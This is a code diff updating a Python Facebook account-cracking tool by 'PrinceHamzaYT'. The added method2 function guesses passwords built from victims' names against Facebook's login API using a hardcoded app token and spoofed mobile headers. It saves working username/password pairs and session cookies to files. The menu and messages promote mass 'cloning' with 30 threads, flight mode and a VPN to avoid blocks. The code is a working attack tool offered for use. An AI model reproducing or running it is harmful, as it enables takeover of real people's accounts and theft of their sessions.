@@ -107,7 +107,7 @@ def logo():
 ║\033[1;97m[+] Author     : PrinceHamzaYT        ║
 ║\033[1;97m[+] FACEBOOK   : PrinceHamzaYT        ║          
 ║\033[1;97m[+] GITHUB     : PrinceHamzaYT        ║
-║\033[1;97m[+] VERSION    : 1.0                  ║
+║\033[1;97m[+] VERSION    : 1.1                  ║
 ╚══════════════════════════════════════╝
 ----------------------------------------''')
 	p(logo)
@@ -123,7 +123,7 @@ def iAmAndroidUa():
 	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
 	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
 	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
-	ua = random.choice(["Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; HTC Desire 21 pro 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Wildfire U20 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.3","Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1","Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1)"])
+	ua = random.choice(["Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/270.0.542728515 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Linux; Android 10; M2010J19SY Build/QKQ1.200830.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36 EdgA/114.0.1823.61","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N975F/N975FXXS8HWC5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; CPH2021 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]","Mozilla/5.0 (Linux; Android 11; SM-A207M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 Instagram 288.1.0.22.66 Android (30/11; 280dpi; 720x1422; samsung; SM-A207M; a20s; qcom; pt_BR; 487359358)","Mozilla/5.0 (Linux; Android 11; SM-A032M Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/361.0.0.12.5;]","Mozilla/5.0 (Linux; Android 12; SM-G990B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Trailer/100.3.6842.43)"])
 	return ua
 
 	
@@ -136,14 +136,14 @@ class Main:
 			line()
 			p(' [•] Program Finished ')
 			p(' [•] \x1b[1;92m[Prince] OK  : %s '%(len(ok)))
-			p(' [•] \x1b[1;96m[Prince] CP  : %s '%(len(cp)))
+			p(' \x1b[0m[•] \x1b[1;96m[Prince] CP  : %s '%(len(cp)))
 			line()
 			input(' [•] Press Enter To Go Back To Main Menu ')
 			clear()
 			self.menu()
 	def menu(self):
 		logo()
-		p(' [•]  \x1b[0m  FREE ')
+		p(' \x1b[1;96m[•]    Trial \x1b[0m')
 		line()
 		p(' [1] File Cracking ')
 		p(" [2] All Country Best Passwords ")
@@ -276,7 +276,7 @@ class Main:
 		clear();logo()
 		p(' [•] Total Clone Accounts : \x1b[1;92m %s '%(len(id)))
 		print("\x1b[0m [•] Use Flight Mode Before Start Cloning")
-		print("        Use VPN USA SERVER")
+		print("        \x1b[1;96mUse VPN For OK IDS\x1b[0m")
 		line()
 		with tpd(max_workers=30) as saqi:
 			for user in id:
@@ -357,9 +357,71 @@ class Main:
 				self.method1(uid,nm,pwx)
 
 	def method2(self,uid,nm,pwx):
-		#YE METHOD 2 HE
-		print(" [ METHOD 2] YHN AP 2ND METHOD LGALO ...")
-		exit()
+		try:
+			global ok , cp , loop
+			sys.stdout.write('\r \x1b[0m[PRINCE] %s | [M-2] OK/CP [\x1b[1;92m%s \x1b[0m|\x1b[1;91m %s\x1b[0m] '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			fn = nm.split(' ')[0]
+			try:
+				ln = nm.split(' ')[1]
+			except:
+				ln = fn
+			for ps in pwx:
+				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
+				data = {"adid": str(uuid.uuid4()),
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": uid,
+"password": pw,
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "en_GB",
+"client_country_code": "GB",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+				headers = {'User-Agent': iAmAndroidUa(),
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
+				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+				if "session_key" in q:
+					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+					cookie = f"sb={sb};{coki}"
+					p('\r\033[1;92m[PRINCE-OK] %s | %s \033[1;97m '%(uid,pw))
+					ok.append(uid)
+					open('/sdcard/PRINCE_M1_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/PRINCE_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+					break
+				elif 'www.facebook.com' in q['error']['message']:
+					p('\x1b[1;96m[PRINCE-CP] %s | %s  '%(uid,pw))
+					cp.append(uid)
+					open('/sdcard/PRINCE_M2_CP.txt','a').write(uid+'|'+pw+'\n')
+					break
+				else:
+					continue
+			loop+=1
+		except requests.exceptions.ConnectionError:
+				self.method1(uid,nm,pwx)
 
 	def method3(self,uid,nm,pwx):
 		#YE METHOD 3 HE
